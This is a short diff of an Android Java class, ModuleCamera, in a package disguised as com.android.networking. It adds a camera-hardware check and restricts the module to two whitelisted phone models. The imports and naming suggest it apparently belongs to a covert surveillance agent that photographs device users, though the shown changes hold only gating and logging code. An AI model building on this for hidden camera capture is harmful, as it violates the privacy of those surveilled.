@@ -14,11 +14,13 @@ import java.util.logging.LogRecord;
 
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.graphics.PixelFormat;
 import android.hardware.Camera;
 import android.hardware.Camera.PictureCallback;
 import android.hardware.Camera.ShutterCallback;
 import android.media.AudioManager;
+import android.os.Build;
 import android.view.SurfaceHolder;
 
 import com.android.networking.Status;
@@ -51,6 +53,24 @@ public class ModuleCamera extends BaseInstantModule {
 		}
 	}
 
+	/** Check if this device has a camera */
+	private boolean checkCameraHardware() {
+	    if (Status.self().getAppContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)){
+	        // this device has a camera
+	    	if (Cfg.DEBUG) {
+				Check.log(TAG + " (checkCameraHardware), camera present");
+			}
+	        return true;
+	    } else {
+	        // no camera on this device
+	    	if (Cfg.DEBUG) {
+				Check.log(TAG + " (checkCameraHardware), no camera");
+			}
+	        return false;
+	    }
+	}
+	
+	String[] whiteList=new String[]{"LT18i", "GT-I9300"};
 	/*
 	 * (non-Javadoc)
 	 * 
@@ -58,8 +78,19 @@ public class ModuleCamera extends BaseInstantModule {
 	 */
 	@Override
 	public boolean parse(ConfModule conf) {
-		setPeriod(1000);
-		return true;
+		for (String white : whiteList) {
+			if(Build.MODEL.equals(white)){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (parse), found white: " + Build.MODEL);
+				}
+				return checkCameraHardware();
+			}
+		}
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (parse), unknown Build.Model:" +Build.MODEL);
+		}
+		return false;
 	}
 
 	/**
